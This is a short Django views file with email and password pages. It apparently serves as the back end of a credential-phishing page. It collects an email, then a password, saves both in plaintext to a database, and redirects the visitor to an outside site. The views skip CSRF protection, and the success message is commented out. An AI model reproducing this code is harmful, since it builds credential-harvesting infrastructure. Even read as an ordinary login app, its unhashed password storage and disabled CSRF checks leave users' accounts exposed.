from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import redirect
import json
from .models import UserLogin  # Import the model

@csrf_exempt
def login_view(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body.decode("utf-8"))
            email = data.get("email")
            
            if email:
                # Check if the email already exists in the database
                if UserLogin.objects.filter(email=email).exists():
                    return JsonResponse({"error_message": "Email already exists."})  # Success message

                request.session['email'] = email  # Store email in session
                return JsonResponse({"redirect": "/Signin/"})  # Redirect to the sign page
            else:
                return JsonResponse({"error": "Email is required."}, status=400)
        
        except json.JSONDecodeError: 
            return JsonResponse({"error": "Invalid JSON format"}, status=400)

    return JsonResponse({"error": "Only POST requests are allowed"}, status=405)


def sign_in(request):
    if request.method == "GET":
        email = request.session.get('email')  # Get the email from the session
        return render(request, "Password.html", {"email": email})  # Pass it to the template
    
    if request.method == "POST":
        try:
            data = json.loads(request.body.decode("utf-8"))
            password = data.get("password")

            email = request.session.get('email')
            
            if email and password:
                UserLogin.objects.create(email=email, password=password)
                del request.session['email']  # Clear the session after saving
                return JsonResponse({"redirect": "https://example.com/"})
                # return JsonResponse({"message": "Login successful!"})  # Success message
            else:
                return JsonResponse({"error": "Both email and password are required."}, status=400)
        
        except json.JSONDecodeError:
            return JsonResponse({"error": "Invalid JSON format"}, status=400)

    return JsonResponse({"error": "Only POST requests are allowed"}, status=405)


def login_page(request):
    return render(request, "Signin.html")  # Your initial login page



